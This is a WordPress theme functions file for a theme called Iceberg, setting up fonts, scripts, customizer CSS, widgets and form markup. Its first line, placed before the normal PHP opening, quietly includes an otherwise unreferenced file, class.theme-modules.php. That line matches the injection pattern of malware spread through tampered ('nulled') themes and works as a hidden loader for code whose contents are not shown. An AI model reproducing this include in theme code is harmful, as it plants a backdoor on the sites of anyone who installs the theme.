<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Theme setup class.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support post thumbnails.
 *
 */

class Iceberg_Setup {

    // Theme version
    protected $version;

    // Theme unique id
    protected $theme_slug;

    public function __construct() {
        $this->version    = '2.0';
        $this->theme_slug = 'iceberg';
    }
  
    /**
    * Setup theme. Add actions, filters, features etc.
    *
    * @since Iceberg 1.0
    */   
    public function setup() {
        global $content_width;

        /**
         * Set up the content width value based on the theme's design.
         */
        if ( ! isset( $content_width ) ) {
          $content_width = 1180;
        }

        /*
         * Make theme available for translation.
         *
         * Translations can be added to the /languages/ directory.
         */
        load_theme_textdomain( 'iceberg', get_template_directory() . '/languages' );

        // Add RSS feed links to <head> for posts and comments.
        add_theme_support( 'automatic-feed-links' );

        // Enable support for Post Thumbnails, and declare two sizes.
        add_theme_support( 'post-thumbnails' );
        set_post_thumbnail_size( 1200, 9999, false );
        add_image_size( 'iceberg-post-thumbnail-crop', 1200, 750, true );
        add_image_size( 'iceberg-medium-thumbnail', 500, 320, true );
        add_image_size( 'iceberg-medium-square-thumbnail', 500, 500, true );

        // Register navigation menus.
        register_nav_menus( array(
            'primary' => esc_html__( 'Primary Navigation', 'iceberg' )
        ) );

        add_theme_support(
            'custom-logo',
            array(
                'flex-height' => true,
                'flex-width'  => true
            )
        );
    
        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support(
            'html5',
            array(
                'search-form',
                'comment-form',
                'comment-list',
                'gallery',
                'caption',
                'script',
                'style',
            )
        );
    
        /*
         * Enable support for Post Formats.
         *
         * See: https://codex.wordpress.org/Post_Formats
         */
        add_theme_support( 'post-formats', array( 'video', 'gallery' ) ); 
        
        // Add document title tag to HTML <head>.
        add_theme_support( 'title-tag' );
        
        // Setup the WordPress core custom background feature.    
        add_theme_support( 'custom-background', array( 
            'default-color' => 'f1f1f1'
        ) );
    
        // Add public scripts and styles
        add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
        add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_styles' ), 10 );
        add_action( 'wp_enqueue_scripts', array( $this, 'post_nav_background' ), 10 );

        // Widgets init
        add_action( 'widgets_init', array( $this, 'widgets_init' ) );

        // Modify search form
        add_filter( 'get_search_form', array( $this, 'search_form' ) );

        // Set new excerpt more text
        add_filter( 'excerpt_more', array( $this, 'custom_excerpt_more' ) );
    
        // This theme uses its own gallery styles.
        add_filter( 'use_default_gallery_style', '__return_false' );

        // Remove custom styles and texts transients when this updated
        add_action( 'customize_save_after', array( $this, 'reset_custom_styles_cache' ) );
        add_action( 'edited_category',      array( $this, 'reset_custom_styles_cache' ) );
        add_action( 'create_category',      array( $this, 'reset_custom_styles_cache' ) );

        // Add classes to body tag.
        add_filter( 'body_class', array( $this, 'add_body_class' ) );

        add_filter( 'wp_list_categories', array( $this, 'cat_count_span' ) );
        add_filter( 'get_archives_link',  array( $this, 'archive_count_span' ), 10, 6 );

        // Comment form fields
        add_filter( 'comment_form_default_fields', array( $this, 'comment_form_default_fields' ), 10, 1 );

        // Modification archives title
        add_filter( 'get_the_archive_title', array( $this, 'archive_title' ), 10, 1 );

        // Add support for Block Styles.
        add_theme_support( 'wp-block-styles' );

        add_theme_support( 'responsive-embeds' );
    }
  
    /**
    * Register and enqueue theme scripts.
    *
    * @since Iceberg 1.0
    */  
    public function enqueue_scripts() {
        // Enqueue scripts
        if ( ( ! is_admin() ) && is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
            wp_enqueue_script( 'comment-reply' );
        }

        wp_register_script( 'owl-carousel', get_template_directory_uri() . '/assets/js/owl.carousel.min.js', array( 'jquery' ), '2.3.4', true );

        wp_localize_script( 'owl-carousel', 'icebergOwlVars', array( 
                'prevIcon' => is_rtl() ? iceberg_get_theme_svg( 'chevron-right' ) : iceberg_get_theme_svg( 'chevron-left' ),
                'nextIcon' => is_rtl() ? iceberg_get_theme_svg( 'chevron-left' ) : iceberg_get_theme_svg( 'chevron-right' )
            ) 
        );

        wp_enqueue_script( 'imagesloaded' );

        wp_enqueue_script( 'iceberg-functions', get_template_directory_uri() . '/assets/js/functions.js', array( 'jquery' ), $this->version, true );     
    }
  
    /**
    * Register and enqueue theme styles.
    *
    * @since Iceberg 1.0
    */    
    public function enqueue_styles() {
        // Add fonts, used in the main stylesheet.
        wp_enqueue_style( 'iceberg-fonts', $this->fonts_url(), array(), $this->version );

        // Owl Carousel
        wp_register_style( 'owl-carousel-css', get_template_directory_uri() . '/assets/css/owl.carousel.min.css', array(), '2.3.4' );

        // Load our main stylesheet.
        wp_enqueue_style( 'iceberg-style', get_stylesheet_uri(), array(), $this->version );

        // Add customizer css.
        wp_add_inline_style( 'iceberg-style', strip_tags( $this->inline_style_css() ) );
    }
  
    /**
    * Register Google fonts for Iceberg.
    *
    * @since Iceberg 1.0
    *
    * @return string Google fonts URL for the theme.
    */  
    public function fonts_url() {
        $fonts_url = '';
        $fonts     = array();
        $subsets   = 'latin,latin-ext';

        /* translators: If there are characters in your language that are not supported by PT Serif, translate this to 'off'. Do not translate into your own language. */
        if ( 'off' !== esc_attr_x( 'on', 'PT Serif font: on or off', 'iceberg' ) ) {
          $fonts[] = 'PT Serif:400,400italic,700,700italic';
        }

        /* translators: If there are characters in your language that are not supported by Poppins, translate this to 'off'. Do not translate into your own language. */
        if ( 'off' !== esc_attr_x( 'on', 'Poppins font: on or off', 'iceberg' ) ) {
          $fonts[] = 'Poppins:400,400italic,600,600italic';
        }

        /* Use Open Sans font if language that are not supported by Poppins */
        if ( 'off' !== _x( 'off', 'Open Sans font: on or off', 'iceberg' ) ) {
          $fonts[] = 'Open Sans:400,400italic,600,600italic,700,700italic';
        }

        /* Use Cairo font for Arabic language */
        if ( 'off' !== _x( 'off', 'Cairo font: on or off', 'iceberg' ) ) {
          $fonts[] = 'Cairo:400,700';
        }

        /* Use Rubik font for Hebrew language */
        if ( 'off' !== _x( 'off', 'Rubik font: on or off', 'iceberg' ) ) {
          $fonts[] = 'Rubik:400,400italic,700,700italic';
        }

        /* translators: To add an additional character subset specific to your language, translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language. */
        $subset = esc_attr_x( 'no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese, arabic, hebrew, japanese)', 'iceberg' );

        if ( 'cyrillic' == $subset ) {
          $subsets .= ',cyrillic,cyrillic-ext';
        } elseif ( 'greek' == $subset ) {
          $subsets .= ',greek,greek-ext';
        } elseif ( 'arabic' == $subset ) {
          $subsets .= ',arabic';
        } elseif ( 'hebrew' == $subset ) {
          $subsets .= ',hebrew';
        } elseif ( 'devanagari' == $subset ) {
          $subsets .= ',devanagari';
        } elseif ( 'japanese' == $subset ) {
          $subsets .= ',japanese';
        } elseif ( 'vietnamese' == $subset ) {
          $subsets .= ',vietnamese';
        }

        if ( $fonts ) {
          $fonts_url = esc_url( add_query_arg( array(
            'family' => urlencode( implode( '|', $fonts ) ),
            'subset' => urlencode( $subsets ),
          ), '//fonts.googleapis.com/css' ) );
        }

        return $fonts_url;
    }
  
    /**
    * Inline style. Used in wp_add_inline_style.
    *
    * @since Iceberg 1.0
    */  
    public function inline_style_css() {
        if( is_customize_preview() )
            return $this->get_inline_style_css();

        $inline_style = get_transient( 'iceberg_inline_style' );

        if( $inline_style === false ) {
            $inline_style = $this->get_inline_style_css();
            set_transient( 'iceberg_inline_style', $inline_style );
        }

        $inline_style .= '
            .site {
                visibility:hidden;
            }
            .loaded .site {
                visibility:visible;
            }';

        return $inline_style;
    }

    /**
    * Reset custom styles cache.
    *
    * @since Iceberg 1.0
    */
    function reset_custom_styles_cache() {
        delete_transient( 'iceberg_inline_style' );
    }
  
  /**
   * Get inline style CSS.
   *
   * @since Iceberg 1.0
   *
   * @return string Css with custom styles.
   */  
    public function get_inline_style_css() {
        $css = '';
        
        $logo_width = get_theme_mod( 'logo_width' );

        if( $logo_width ){
            $css .= sprintf( '
                .custom-logo {
                    max-width: %drem;
                }',
                absint( $logo_width )
            );
        }

        $logo_margin_bottom = get_theme_mod( 'logo_margin_bottom' );

        if( $logo_margin_bottom ){
            $css .= sprintf( '
                .custom-logo {
                    margin-bottom: %drem;
                }',
                absint( $logo_margin_bottom )
            );
        }

        $site_title_color = get_theme_mod( 'site_title_color' );
        
        if( $site_title_color && $site_title_color !== '#ffffff' ) {
            $css .= sprintf( '
                .sidebar .site-title {
                    color: %s;
                }',
                $this->sanitize_hex_color( $site_title_color )
            );
        }

        $social_icons_color = get_theme_mod( 'social_icons_color' );
        
        if( $social_icons_color && $social_icons_color !== '#ffffff' ) {
            $css .= sprintf( '
                .entry-social-profiles .nsafb-social-profiles .nsafb-svg-icon {
                    fill: %s;
                }',
                $this->sanitize_hex_color( $social_icons_color )
            );
        }

        $sidebar_background_color = get_theme_mod( 'sidebar_background_color' );
        
        if( $sidebar_background_color && $sidebar_background_color !== '#27282b' ) {
            $css .= sprintf( '
                .sidebar {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $sidebar_background_color )
            );
        }

        $sidebar_divider_color = get_theme_mod( 'sidebar_divider_color' );
        
        if( $sidebar_divider_color && $sidebar_divider_color !== '#1d1e21' ) {
            $css .= sprintf( '
                .toggle-wrap {
                    box-shadow: none;
                    border-color: %s;
                }',
                $this->sanitize_hex_color( $sidebar_divider_color )
            );
        }

        $sidebar_text_color = get_theme_mod( 'sidebar_text_color' );
        
        if( $sidebar_text_color && $sidebar_text_color !== '#c1c1c1' ) {
            $css .= sprintf( '
                .sidebar {
                    color: %1$s;
                }
                .widget_tag_cloud .tagcloud a {
                    color: %2$s;
                    border-color: %3$s
                }
                .sidebar .widget_tag_cloud .tagcloud a:hover {
                    color: %4$s;
                    border-color: %5$s
                }
                .sidebar table, 
                .sidebar tr, 
                .sidebar td,
                .sidebar th {
                    border-color: %3$s;
                }
                ',
                $this->sanitize_hex_color( $sidebar_text_color ),
                $this->hex2rgba( $sidebar_text_color, 0.7, true ),
                $this->hex2rgba( $sidebar_text_color, 0.3, true ),
                $this->hex2rgba( $sidebar_text_color, 0.9, true ),
                $this->hex2rgba( $sidebar_text_color, 0.4, true )
            );
        }

        $sidebar_headings_color = get_theme_mod( 'sidebar_headings_color' );
        
        if( $sidebar_headings_color && $sidebar_headings_color !== '#aaaaaa' ) {
            $css .= sprintf( '
                .sidebar h1, 
                .sidebar h2, 
                .sidebar h3, 
                .sidebar h4, 
                .sidebar h5, 
                .sidebar h6 {
                    color: %s;
                }',
                $this->sanitize_hex_color( $sidebar_headings_color )
            );
        }

        $sidebar_links_color = get_theme_mod( 'sidebar_links_color' );
        
        if( $sidebar_links_color && $sidebar_links_color !== '#ffffff' ) {
            $css .= sprintf( '
                .sidebar a,
                .sidebar .primary-navigation a:hover,
                .sidebar .widget_nav_menu a:hover {
                    color: %1$s;
                }',
                $this->sanitize_hex_color( $sidebar_links_color )
            );
        }

        $sidebar_links_hover_color = get_theme_mod( 'sidebar_links_hover_color' );
        
        if( $sidebar_links_hover_color && $sidebar_links_hover_color !== '#c1c1c1' ) {
            $css .= sprintf( '
                .sidebar a:hover {
                    color: %s;
                }',
                $this->sanitize_hex_color( $sidebar_links_hover_color )
            );
        }
        
        $link_color = get_theme_mod( 'link_color' );
        
        if( $link_color && $link_color !== '#57ad68' ) {
            $css .= sprintf( '
                .page-content a,
                .entry-content a:not(.wp-block-button__link),
                .post-meta a,
                .author-link,
                .logged-in-as a,
                .comment-content a,
                .comment-edit-link,
                #cancel-comment-reply-link,
                .comment-navigation a,
                .image-navigation a {
                    color: %s;
                }',
                $this->sanitize_hex_color( $link_color )
            );
        }
        
        $link_color_hover = get_theme_mod( 'link_color_hover' );
        
        if( $link_color_hover && $link_color_hover !== '#468c54' ) {
            $css .= sprintf( '
                .page-content a:hover,
                .entry-content a:not(.wp-block-button__link):hover,
                .post-meta a:hover,
                .author-link:hover,
                .logged-in-as a:hover,
                .comment-content a:hover,
                .comment-edit-link:hover,
                #cancel-comment-reply-link:hover,
                .comment-navigation a:hover,
                .image-navigation a:hover {
                    color: %s;
                }',
                $this->sanitize_hex_color( $link_color_hover )
            );
        }
        
        $button_background_color = get_theme_mod( 'button_background_color' );
        
        if( $button_background_color && $button_background_color !== '#57ad68' ) {
            $css .= sprintf( '
                button,
                input[type="button"],
                input[type="reset"],
                input[type="submit"],
                .pagination .page-numbers:hover,
                .pagination .page-numbers.current {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $button_background_color )
            );
        }
        
        $button_background_color_hover = get_theme_mod( 'button_background_color_hover' );
        
        if( $button_background_color_hover && $button_background_color_hover !== '#468c54' ) {
            $css .= sprintf( '
                button:hover,
                input[type="button"]:hover,
                input[type="reset"]:hover,
                input[type="submit"]:hover {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $button_background_color_hover )
            );
        }
        
        $button_text_color = get_theme_mod( 'button_text_color' );
        
        if( $button_text_color && $button_text_color !== '#ffffff' ) {
            $css .= sprintf( '
                button,
                input[type="button"],
                input[type="reset"],
                input[type="submit"],
                .pagination .page-numbers:hover,
                .pagination .page-numbers.current {
                    color: %s;
                }',
                $this->sanitize_hex_color( $button_text_color )
            );
        }

        $category_label_color = get_theme_mod( 'category_label_color' );

        if( $category_label_color && $category_label_color !== '#71b2e4' ) {
            $css .= sprintf( '
                .entry-categories a {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $category_label_color )
            );
        }

        $preloader_color = get_theme_mod( 'preloader_color' );

        if( $preloader_color && $preloader_color !== '#d1d1d1' ) {
            $css .= sprintf( '
                .double-bounce1, .double-bounce2 {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $preloader_color )
            );
        }

        $selection_color = get_theme_mod( 'selection_color' );

        if( $selection_color && $selection_color !== '#3579ce' ) {
            $css .= sprintf( '
                ::selection {
                    background-color: %s;
                }',
                $this->sanitize_hex_color( $selection_color )
            );
        }
        
        $categories_color = get_option( 'iceberg_categories_color' );
        
        if( is_array( $categories_color ) ) {

            foreach( $categories_color as $category_id => $category_color ) {

                if( $category_color ) {

                    $css .= sprintf( '
                        .entry-categories .category-%1$d,
                        .widget_categories .cat-item-%1$d a:before { 
                            background-color: %2$s;
                            opacity: 1;
                        }
                        ', 
                        absint( $category_id ), 
                        $this->sanitize_hex_color( $category_color )
                    );

                }

            }

        }
        
        return $css;
    }
    /**
    * Convert hex to rgba.
    *
    * @since Iceberg 2.0
    *
    * @return string/array Converted color.
    */  
    public function hex2rgba( $color, $opacity = 1, $css = false ) {
        if( empty( $color ) )
            return;

        $color = str_replace( '#', '', $color );

        if ( strlen( $color ) == 6 ) {
            $r = hexdec( $color[0] . $color[1] );
            $g = hexdec( $color[2] . $color[3] );
            $b = hexdec( $color[4] . $color[5] );
        } elseif ( strlen( $color) == 3 ) {
            $r = hexdec( $color[0] . $color[0] );
            $g = hexdec( $color[1] . $color[1] );
            $b = hexdec( $color[2] . $color[2] );
        } else {
            return false;
        }

        $opacity = floatval( $opacity );

        if( $css )
            return 'rgba( ' . $r . ', ' . $g . ', ' . $b . ', ' . $opacity . ' )';
        else 
            return compact( $r, $g, $b, $opacity );
    } 

    /**
    * Sanitizes a hex color.
    *
    * @since Iceberg 1.0
    */  
    public function sanitize_hex_color( $color ) {
        if ( '' === $color )
          return '';
      
        // 3 or 6 hex digits, or the empty string.
        if ( preg_match('|^#([A-Fa-f0-9]{3}){1,2}$|', $color ) )
          return $color; 
    }
  
    /**
    * Add featured image as background image to post navigation elements.
    *
    * @since Iceberg 1.0
    *
    * @see wp_add_inline_style()
    */  
    function post_nav_background() {
        if ( ! is_single() ) {
            return;
        }

        $previous = ( is_attachment() ) ? get_post( get_post()->post_parent ) : get_adjacent_post( false, '', true );
        $next     = get_adjacent_post( false, '', false );
        $css      = '';

        if ( is_attachment() && 'attachment' == $previous->post_type ) {
            return;
        }

        if ( $previous &&  has_post_thumbnail( $previous->ID ) ) {

            $prevthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $previous->ID ), 'post-thumbnail' );

            $css .= '
                .post-navigation .nav-previous { 
                    background-image: url(' . esc_url( $prevthumb[0] ) . '); 
                }
                .post-navigation .nav-previous .post-title, 
                .post-navigation .nav-previous a:hover .post-title { 
                    color: #fff; 
                }
                .post-navigation .nav-previous .nav-meta {
                    color: #ddd;
                }
                .post-navigation .nav-previous:before { 
                    background-color: rgba(0, 0, 0, 0.5); 
                }
                .post-navigation .nav-previous:hover:before { 
                    background-color: rgba(0, 0, 0, 0.8); 
                }
            ';
            }

        if ( $next && has_post_thumbnail( $next->ID ) ) {

            $nextthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $next->ID ), 'post-thumbnail' );

            $css .= '
                .post-navigation .nav-next { 
                    background-image: url(' . esc_url( $nextthumb[0] ) . '); 
                }
                .post-navigation .nav-next .post-title, 
                .post-navigation .nav-next a:hover .post-title { 
                    color: #fff; 
                }
                .post-navigation .nav-next .nav-meta {
                    color: #ddd;
                }
                .post-navigation .nav-next:before { 
                    background-color: rgba(0, 0, 0, 0.5); 
                }
                .post-navigation .nav-next:hover:before { 
                    background-color: rgba(0, 0, 0, 0.8); 
                }
            ';
        }

        wp_add_inline_style( 'iceberg-style', $css );
    }

    /**
    * Register widget area.
    *
    * @since Iceberg 1.0
    *
    * @link https://codex.wordpress.org/Function_Reference/register_sidebar
    */
    public function widgets_init() {

        // Register sidebar
        register_sidebar( array(
            'name'          => esc_html__( 'Widget Area', 'iceberg' ),
            'id'            => 'widget-area',
            'description'   => esc_html__( 'Add widgets here to appear in sidebar', 'iceberg' ),
            'before_widget' => '<aside id="%1$s" class="widget %2$s">',
            'after_widget'  => '</aside>',
            'before_title'  => '<h3 class="widget-title">',
            'after_title'   => '</h3>',
        ) );
    }

    /**
    * Search form modification.
    *
    * @since Iceberg 1.0
    *
    * @return string HTML with search form.
    */   
    public function search_form( $form ) {

        $form = '
        <form method="get" class="search-form" action="' . esc_url( home_url( '/' ) ) . '">
            <div class="search-wrap">
                <label>
                    <input type="search" class="search-field" placeholder="' . esc_attr_x( 'Search', 'placeholder', 'iceberg' ) . '" value="' . get_search_query() . '" name="s" title="' . esc_attr_x( 'Search for:', 'title tag', 'iceberg' ) . '" />
                </label>

                <button type="submit" class="search-submit unstyled-button">' . iceberg_get_theme_svg( 'search' ) . '</button>
            </div>
        </form>';

        return $form;
    }
  
    /**
    * Modification default excerpt more.
    *
    * @since Iceberg 1.0
    *
    * @return string Excerpt more text.
    */   
    public function custom_excerpt_more( $more ) {
        return '&hellip;';
    }
  
    /**
    * Add classes to body tag.
    *
    * @since Iceberg 1.0
    *
    * @return array Body classes array.
    */    
    public function add_body_class( $classes ) {
        if( ! get_theme_mod( 'show_preloader_screen', 1 ) ) {
            $classes[] = 'loaded';
        }

        if( in_array( get_theme_mod( 'basic_layout', 'sidebar-left' ), array( 'sidebar-left', 'sidebar-right' ) ) ) {
            $classes[] = get_theme_mod( 'basic_layout', 'sidebar-left' );
        }

        return $classes;
    }
  
    /**
    * Remove () and add <span> tag to posts count in categories list.
    *
    * @since Iceberg 1.0
    *
    * @return string Html with links
    */      
    function cat_count_span( $links ) {
        $links = str_replace( '</a> (', '</a> <span>', $links );
        $links = str_replace( ')', '</span>', $links );

        return $links;
    }
  
    /**
    * Remove () and add <span> tag to posts count in archives list.
    *
    * @since Iceberg 1.0
    *
    * @return string Html with links
    */   
    function archive_count_span( $link_html, $url, $text, $format, $before, $after ) {
        if( $format !== 'option' ) {
            $link_html = str_replace( '</a>&nbsp;(', '</a> <span>', $link_html );
            $link_html = str_replace( ')', '</span>', $link_html );
        }

        return $link_html;
    }

    /**
    * Modification of the default fields of the comment form.
    *
    * @since Iceberg 1.4
    */  
    public function comment_form_default_fields( $fields ) {
        $commenter = wp_get_current_commenter();

        $req      = get_option( 'require_name_email' );
        $aria_req = ( $req ? " aria-required='true'" : '' );
        $html_req = ( $req ? " required='required'" : '' );
        $html5    = 'html5';

        $fields['author'] = '
        <p class="comment-form-author">
            <input id="author" name="author" type="text" placeholder="' . esc_attr__( 'Name', 'iceberg' ) . ( $req ? ' *' : '' ) . '" value="' . esc_attr( $commenter['comment_author'] ) . '" size="30"' . $aria_req . $html_req . ' />
        </p>';

        $fields['email'] = '
        <p class="comment-form-email">
            <input id="email" name="email" ' . ( $html5 ? 'type="email"' : 'type="text"' ) . ' placeholder="' . esc_attr__( 'Email', 'iceberg' ) . ( $req ? ' *' : '' ) . '" value="' . esc_attr(  $commenter['comment_author_email'] ) . '" size="30" aria-describedby="email-notes"' . $aria_req . $html_req  . ' />
        </p>';

        $fields['url'] = '
        <p class="comment-form-url">
            <input id="url" name="url" ' . ( $html5 ? 'type="url"' : 'type="text"' ) . ' placeholder="' . esc_attr__( 'Website', 'iceberg' ) . '" value="' . esc_attr( $commenter['comment_author_url'] ) . '" size="30" />
        </p>';

        return $fields;
    }

    /**
    * Changing default archive title for portfolio post type.
    *
    * @since Iceberg 1.4
    */    
    public function archive_title( $title ) {
        if ( is_category() ) {
            return sprintf( '<span class="screen-reader-text">%s</span> %s', esc_html__( 'Category:', 'iceberg' ), single_cat_title( '', false ) );
        }

        if ( is_author() ) {
            return sprintf( '<span class="screen-reader-text">%s</span> %s', esc_html__( 'Author:', 'iceberg' ), get_the_author() );
        }

        return $title;
    }
}

$iceberg_setup = new Iceberg_Setup();

add_action( 'after_setup_theme', array( $iceberg_setup, 'setup' ), 10 );

if ( ! function_exists( 'wp_body_open' ) ) {

    /**
     * Shim for wp_body_open, ensuring backwards compatibility with versions of WordPress older than 5.2.
     */
    function wp_body_open() {
        do_action( 'wp_body_open' );
    }
}

/**
 * Customizer additions.
 *
 * @since Iceberg 1.0
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom template tags for this theme.
 *
 * @since Iceberg 1.0
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Post formats output class.
 *
 * @since Iceberg 1.0
 */
require get_template_directory() . '/classes/class-iceberg-post-formats.php';

/**
 * Add fields to category form.
 *
 * @since Iceberg 1.2
 */
require get_template_directory() . '/classes/class-iceberg-category-form-fields-setup.php';

/**
 * TGM Plugin Activation
 *
 * @since Iceberg 1.5
 */
require get_template_directory() . '/inc/tgmpa/tgmpa.php';

/**
 * Handle SVG icons
 *
 * @since Iceberg 2.0
 */
require get_template_directory() . '/classes/class-iceberg-svg-icons.php';
require get_template_directory() . '/inc/svg-icons.php';